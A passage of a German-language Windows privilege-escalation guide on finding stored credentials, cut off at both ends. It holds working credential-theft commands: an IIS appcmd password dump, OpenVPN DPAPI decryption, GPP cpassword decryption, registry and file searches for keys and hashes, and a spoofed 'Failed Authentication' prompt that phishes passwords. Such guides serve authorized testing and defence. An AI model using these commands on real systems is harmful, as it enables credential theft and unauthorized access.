    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installer werden **mit SYSTEM-Berechtigungen ausgeführt**; viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registrierung (Anmeldedaten)

### Anmeldedaten-Artefakte von Support-Tools in der Registrierung

Einige ältere Remote-Support-Installationen behalten unter festen Anwendungsschlüsseln in der Registrierung wertbezogene Namen mit Bezug zu Passwörtern bei. Beispielsweise kennzeichnete `SecurityPasswordAES` von TeamViewer laut [Erklärung des Herstellers zu Registrierungsschlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Wertnamensmarker ist lediglich ein Hinweis für die Überprüfung: Verifizieren Sie die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie diese Anmeldedaten bewerten. Der Wechsel von einem Remote-Support-Passwort zu einem privilegierteren Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und Sie für dieses Konto autorisiert sind. Nehmen Sie Chiffretexte und wiederhergestellte Passwörter nicht in routinemäßige Aufzählungsausgaben auf.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn der Verdacht besteht, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und Arbeitsblattschutz oder ausgeblendeten Spalten. [Microsoft erklärt](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung einschränkt und kein Sicherheitsfeature ist; er belegt für sich genommen nicht, dass der Inhalt der Arbeitsmappe verschlüsselt ist. Prüfen Sie nur autorisierte, relevante Dateien und vermeiden Sie es, mögliche Geheimnisse bei einer umfassenden Aufzählung auszugeben. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Anmeldedaten vorhanden sind, noch, dass ein Konto höhere Berechtigungen besitzt; verifizieren Sie die tatsächlichen Daten und die aktuellen Kontorechte separat.

### Vom CI-Server aufbewahrte Änderungspatches

Ein CI-Server kann übermittelte Quellcodeänderungen nach Abschluss des Builds in seinem Datenverzeichnis aufbewahren. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Änderungen aus Remote-Runs; das Datenverzeichnis kann konfiguriert werden und muss sich nicht unter `ProgramData` befinden. Ein lesbarer Patch kann Verweise auf eine Anmeldedatendatei, einen Verschlüsselungsschlüssel oder ein Skript, das beides verwendet, enthalten, auch wenn diese Verweise hinzugefügt oder entfernt wurden. Beispielsweise benötigt ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` sowohl den AES-Schlüssel als auch die verschlüsselte Zeichenfolge; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat angegeben wird. Prüfen Sie zunächst nur die Namen zugänglicher Patches und untersuchen Sie relevante Inhalte anschließend autorisiert, ohne Geheimnisse bei routinemäßigen Aufzählungen auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Anmeldedaten noch Zugriff mit höheren Berechtigungen. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen zu committen.

### Benutzerdefinierte Rotation lokaler Administratorkennwörter

Ein selbst entwickeltes Tool zur Kennwortrotation kann ein verschlüsseltes lokales Administratorkennwort in einem lokalen Dienst speichern und zugleich dessen Datenspeicher-Anmeldedaten in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei ablegen. Prüfen Sie gemeinsam die geplante Aufgabe des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen des Datenspeichers. Ein ausschließlich an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Anmeldedaten weiterhin erreichbar; die Authentifizierung allein beweist jedoch nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Wenn das Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, prüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mit Go's [`math/rand`](https://pkg.go.dev/math/rand) ableitet, ist zum Schutz dieses Kennworts ungeeignet; Go weist darauf hin, dass dieses Paket für sicherheitskritische Zufallswerte ungeeignet ist. Vergewissern Sie sich, dass ein wiederhergestelltes Kennwort aktuell ist und zu einem Konto in der lokalen Gruppe „Administrators“ gehört, bevor Sie es als möglichen Eskalationspfad einstufen. Eine geplante Aufgabe, ein `.env`-Pfad oder ein verschlüsselter Blob belegt keine dieser Voraussetzungen. Nehmen Sie Passwörter und Schlüsselmaterial nicht in routinemäßige Aufzählungsausgaben auf.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview), um lokale Administratorkennwörter verwaltet zu speichern. Dessen Verzeichnis- oder Entra-basierter Speicher und die zugehörigen Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; auch [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) legen fest, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen darf.

### Java-Server-Plugin-Archive und Wiederverwendung von Anmeldedaten

Einige Java-Server-Plugins werden als JAR-Archive im `plugins`-Verzeichnis eines Servers bereitgestellt. Ein lesbares benutzerdefiniertes Plugin kann Konfigurationen oder Bytecode mit eingebetteten Dienstanmeldedaten enthalten. Prüfen Sie das Archiv nur mit entsprechender Autorisierung und nehmen Sie wiederhergestellte Geheimnisse nicht in routinemäßige Aufzählungsausgaben auf. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist. Ein wiederhergestelltes Dienstpasswort führt nur dann zu höheren Berechtigungen, wenn es auch für ein privilegierteres Konto gültig ist. Prüfen Sie die relevanten Datei-ACLs und ersetzen Sie wiederverwendete Anmeldedaten durch jeweils eigene Geheimnisse. Informationen zum Verzeichnislayout finden Sie in [PaperMCs Plugin-Installationsanleitung](https://docs.papermc.io/paper/adding-plugins/) und zu Archivinhalten in [Oracles JAR-Dokumentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Anmeldedaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, prüfen Sie gemeinsam die `OFUSER`-Einträge und die Eigenschaft `passwordKey`. Laut Openfires [Dokumentation zum User-Provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Passwörter im Klartext oder mit einem in dieser Eigenschaft gespeicherten Schlüssel verschlüsselt abgelegt werden. Ein wiederhergestelltes Passwort ist für eine Rechteausweitung nur relevant, wenn es für eine privilegiertere Identität noch gültig ist; der Dateiname allein belegt weder Lesezugriff noch die Wiederverwendung von Anmeldedaten. Der Pfad ist ein Hinweis für die Bestandsaufnahme. Nehmen Sie Datenbankinhalte und Anmeldedaten nicht in routinemäßige Aufzählungsausgaben auf.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Administrationskonsole offenlegen, auch wenn eine externe Datenbank verwendet wird. Openfire bindet seine Administrationskonsole häufig an Loopback; ein lokales Konto kann die Adresse dennoch erreichen, wenn der Listener aktiv ist. Prüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Administratorrolle, die Richtlinie für Plugin-Uploads und die Openfire-Dienstidentität. Ein Administrator, der ein Plugin installieren kann, kann bewirken, dass Plugin-Code im Kontext des Dienstes ausgeführt wird. Das kann hochprivilegiert sein, wenn der Dienst als LocalSystem ausgeführt wird. Ein passendes Kontopasswort oder ein lesbarer Konfigurationspfad allein belegt weder den Zugriff auf die Administrationskonsole noch die Codeausführung. Siehe die [Installations- und Plugin-Verwaltungsanleitung des Herstellers](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration des forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen, die üblicherweise `server.config.yaml` heißen, können `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit geringeren Berechtigungen diesen Schlüssel lesen kann, kann er möglicherweise ein API-Clientzertifikat erstellen. Ob dies zu höheren Berechtigungen führt, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder der Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält anderes Material; ihr Fund belegt keinen Zugriff auf die Server-CA. Bei manchen Bereitstellungen bleibt der private CA-Schlüssel offline, sodass eine lesbare Serverkonfiguration den Signaturschlüssel möglicherweise nicht enthält.

Prüfen Sie auf einem Windows-Server die ACL der **Serverkonfiguration** in dessen Installationsverzeichnis sowie etwaiger geschützter Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; verwenden Sie den konfigurierten Pfad des Dienstes, falls dieser davon abweicht. Vergewissern Sie sich, dass die aktuelle Identität die Datei lesen kann und `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Aufzählungsausgaben aus. Der Workflow `config api_client` des Herstellers verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; erforderlich ist jedoch auch eine wirksame serverseitige Rolle. Deren Erstellung oder Änderung kann Schreibzugriff auf den Datenspeicher oder einen Neustart voraussetzen. Eine bestehende privilegierte Serveridentität kann einen möglichen Weg eröffnen, auch wenn diese Schreibzugriffe nicht verfügbar sind. API-Abfragen mit Ausführungsrechten laufen im jeweiligen Server- oder Agentenkontext und können hochprivilegiert sein.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signaturschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen und den Zugriff auf Listener. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY-Anmeldedaten

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein natives verschlüsseltes Speicherarchiv befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während ein exportiertes Sitzungsbackup `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. In der [Exportanleitung von SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) steht, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; im [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wird das native Speicherarchiv genannt. Prüfe zuerst Dateiberechtigungen und Pfade. Das Auffinden einer der Dateien verrät weder das zugehörige Passwort noch beweist es, dass gespeicherte Anmeldedaten noch gültig sind oder höhere Berechtigungen besitzen.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-Privatschlüssel können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht läuft und du möchtest, dass er beim Systemstart automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige ssh keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh an einem Rechner anzumelden. Die Registry HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und procmon hat während der Authentifizierung mit asymmetrischen Schlüsseln keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Sie können auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- und SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können auch Offline-`SAM`-, `SECURITY`- und `SYSTEM`-Hives enthalten. Prüfe zuerst lokal zugängliche Backup- oder Image-Verzeichnisse und untersuche die **Dateinamen der enthaltenen Elemente**, bevor du etwas extrahierst. Allein ein `.wim`-Dateiname beweist nicht, dass Hives offengelegt sind; gewöhnliche `install.wim`-, `boot.wim`- und Recovery-Images führen häufig auf eine falsche Fährte. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn sie im Scope liegt. Siehe die [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und die [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) von Microsoft.

### Cloud-Anmeldedaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Rechnern bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten alle Domänenbenutzer auf die Group Policy Objects (GPOs) zugreifen, die als XML-Dateien in SYSVOL gespeichert waren. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien mit einem nicht leeren Feld „cpassword“ sucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und erleichtert so die Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Mit crackmapexec die Passwörter abrufen:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS-Webkonfiguration

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für eine web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem über HTTP erreichbaren Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du von einer Offenlegung ausgehst. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Kandidat. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne die Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ein Archivname belegt weder, dass es ein Geheimnis enthält, noch, dass ein wiederhergestellter Zugang höhere Berechtigungen gewährt.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den **Benutzer jederzeit auffordern, seine Zugangsdaten oder sogar die Zugangsdaten eines anderen Benutzers einzugeben**, wenn du glaubst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die früher **Passwörter** im **Klartext** oder als **Base64** enthielten.

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Variante der Dateinamensliste ohne die Password Safe-Dateiendung

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password-Safe-v3-Datenbanken verwenden häufig die Erweiterung `.psafe3`. Betrachte einen Dateinamen mit dieser Endung als möglichen Hinweis auf einen verschlüsselten Tresor; allein sein Vorhandensein bedeutet nicht, dass du ihn lesen, entsperren oder gespeicherte Zugangsdaten verwenden kannst. Prüfe bei der Untersuchung, wo solche Dateien gespeichert sind, zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls nur ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren benötigst du das tatsächliche Master-Passwort sowie alle konfigurierten Schlüsseldateien oder Konto-Faktoren. Falls eine autorisierte Untersuchung in einem Eintrag ein LM:NT-Hash-Paar findet, überprüfe das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag gewährt für sich allein keine Administrator- oder SYSTEM-Rechte; auch der Remote-Zugriff auf den Dienst, die Kontoberechtigungen und alle separaten Schritte zur Dienstausführung müssen gegeben sein. Die Bestandsaufnahme sollte den Pfad und die Lesbarkeit des Tresors angeben, aber weder die Datenbank noch gespeicherte Zugangsdaten ausgeben.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Variante des Suchbefehls ohne die Password-Safe-Erweiterung

```
cd C:\
